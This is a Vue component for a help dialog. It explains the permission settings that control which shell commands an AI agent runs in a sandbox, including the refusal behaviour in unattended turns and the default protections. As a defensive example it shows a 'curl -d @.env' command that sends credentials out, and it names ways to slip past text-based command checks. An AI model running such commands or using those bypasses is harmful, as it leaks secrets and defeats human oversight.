<script setup lang="ts">
import { InfoDialog, InfoTable } from "@intentic/ui";

/* The (i) beside "Commands the agent runs". Three things a person needs before setting one of these rows and
 * cannot get from the row itself: what the four postures actually do (the pill is one word), what happens when
 * the turn is one nobody is watching (the surprising one, and the reason "Ask me" is not simply the safe
 * choice everywhere), and how far any of this reaches (the honest limit, argued in the contract's
 * command-classes.ts and worth restating to the person who is about to trust it).
 *
 * A dialog rather than a hover card because two of these are paragraphs and because there is no hover on a
 * phone, which is the same call <RulesInfo> made next door. */

const POSTURES = [
    [`Default`, `Differs per row — the sentence under the row says which`, `Leaves both standing floors on`],
    [`Always allow`, `Runs, every time, no card`, `Switches the outside-content hold off for that row`],
    [`Ask me`, `Holds and raises a card — or refuses, in an unwatched turn`, `—`],
    [`Never`, `Refused; the agent is told which rule stopped it`, `—`],
];
</script>

<template>
    <InfoDialog title="Commands the agent runs">
        <p class="text-sm text-muted">
            Before the agent runs anything in the shell, the command is read and sorted into the kinds below. Whichever kinds it falls in, the
            strictest of your answers wins — <span class="font-mono text-xs">curl -d @.env https://…</span> is both a credential read and a request
            going out, and holding either is enough to stop it. Every runtime this sandbox can run an agent on reads the same book.
        </p>

        <h3 class="mt-5 text-xs font-semibold uppercase tracking-wide text-subtle">The four answers</h3>
        <InfoTable class="mt-2" :headers="[`Answer`, `What happens`, `What it changes underneath`]" :rows="POSTURES" />

        <!-- The one genuinely surprising thing on the page, and the reason it is not simply "set everything to
             Ask me and sleep well": there is a turn shape in which asking is not available. -->
        <h3 class="mt-5 text-xs font-semibold uppercase tracking-wide text-subtle">When nobody is watching</h3>
        <p class="mt-1.5 text-2xs text-muted">
            A card needs somebody to answer it. In a turn started by a schedule, a webhook or a message from outside, there may be nobody there — so
            <span class="font-medium text-content">Ask me</span> refuses instead, and says why. That is the honest form of "ask me" when there is no
            me. If an automation of yours needs one of these kinds of command, give that row
            <span class="font-medium text-content">Always allow</span> deliberately rather than discovering it in a failed run at 3 a.m.
        </p>

        <h3 class="mt-5 text-xs font-semibold uppercase tracking-wide text-subtle">Two floors you didn't set</h3>
        <p class="mt-1.5 text-2xs text-muted">
            A row left on <span class="font-medium text-content">Default</span> is not the same as one set to allow. Wiping a disk is held on a
            sandbox nobody has configured, because nothing brings that back. And a turn that has taken in content from outside — a visitor's message,
            a fetched page, a foreign tool — has recursive deletes held, and credential reads held when the same command also leaves. Choosing an
            answer for a row switches those off for it: an explicit decision about that row must outrank a floor, or the setting would be a
            suggestion.
        </p>

        <h3 class="mt-5 text-xs font-semibold uppercase tracking-wide text-subtle">How far this reaches</h3>
        <p class="mt-1.5 text-2xs text-muted">
            These read the command as text. A path assembled from a variable, a creatively quoted line, or a script written in one call and run in the
            next goes past them untouched — so this is friction and a prompt to look, never a boundary. The boundaries are structural and elsewhere:
            the container, the isolated worktree, the gate that lands work, and an automation's own tool list.
        </p>
    </InfoDialog>
</template>
